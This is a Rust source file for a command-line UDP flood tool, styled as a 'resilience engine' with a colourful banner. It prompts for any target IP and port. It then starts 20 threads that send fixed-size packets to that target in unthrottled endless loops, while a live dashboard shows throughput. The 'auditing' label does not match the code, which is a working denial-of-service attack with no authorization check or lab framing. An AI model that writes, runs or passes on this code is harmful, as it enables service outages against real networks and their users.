use std::net::UdpSocket;
use std::thread;
use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Instant, Duration};

const BANNER: &str = r#"
\x1b[95m
███╗   ██╗███████╗██╗  ██╗ ██████╗       ████████╗███████╗ ██████╗██╗  ██╗
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗      ╚══██╔══╝██╔════╝██╔════╝██║  ██║
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║  █████╗ ██║   █████╗  ██║     ███████║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║  ╚════╝ ██║   ██╔══╝  ██║     ██╔══██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝         ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝          ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
          >> NEXO-TECH ULTIMATE RESILIENCE ENGINE v10.0 <<
\x1b[0m"#;

fn main() -> io::Result<()> {
    println!("{}", BANNER);

    // Dynamic Configuration
    print!("\x1b[93m[INPUT] Target IP Address: \x1b[0m");
    io::stdout().flush()?;
    let mut ip = String::new();
    io::stdin().read_line(&mut ip)?;

    print!("\x1b[96m[INPUT] Target Service Port: \x1b[0m");
    io::stdout().flush()?;
    let mut port = String::new();
    io::stdin().read_line(&mut port)?;

    let target = format!("{}:{}", ip.trim(), port.trim());
    let packet_size: u64 = 1400; // MTU Optimized for speed
    let thread_count = 20;       // Aggressive worker count

    let total_packets = Arc::new(AtomicU64::new(0));
    let total_bytes = Arc::new(AtomicU64::new(0));

    println!("\n\x1b[91m[CRITICAL] SYSTEM ENGAGED: AUDITING {}\x1b[0m", target);
    println!("\x1b[34m[INFO] Workers: {} Threaded Handlers Activated\x1b[0m\n", thread_count);

    // Multi-Threaded Engine
    for _ in 0..thread_count {
        let target_clone = target.clone();
        let p_count = Arc::clone(&total_packets);
        let b_count = Arc::clone(&total_bytes);
        let payload = vec![0u8; packet_size as usize];

        thread::spawn(move || {
            let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to bind socket");
            loop {
                // Maximum velocity transmission
                if socket.send_to(&payload, &target_clone).is_ok() {
                    p_count.fetch_add(1, Ordering::Relaxed);
                    b_count.fetch_add(packet_size, Ordering::Relaxed);
                }
            }
        });
    }

    // Real-Time Analytics Dashboard
    let start_time = Instant::now();
    loop {
        thread::sleep(Duration::from_millis(500));
        let elapsed = start_time.elapsed().as_secs_f64();
        let packets = total_packets.load(Ordering::Relaxed);
        let bytes = total_bytes.load(Ordering::Relaxed);
        
        let mb_total = bytes as f64 / 1_048_576.0;
        let mbps = mb_total / elapsed;

        // Clears the line and updates with professional color coding
        print!("\x1b[2K\r\x1b[93mTIME: {:.1}s \x1b[92m| PKTS: {} \x1b[91m| LOAD: {:.2} MB/s \x1b[95m| TOTAL: {:.2} MB\x1b[0m", 
               elapsed, packets, mbps, mb_total);
        io::stdout().flush()?;
    }
}
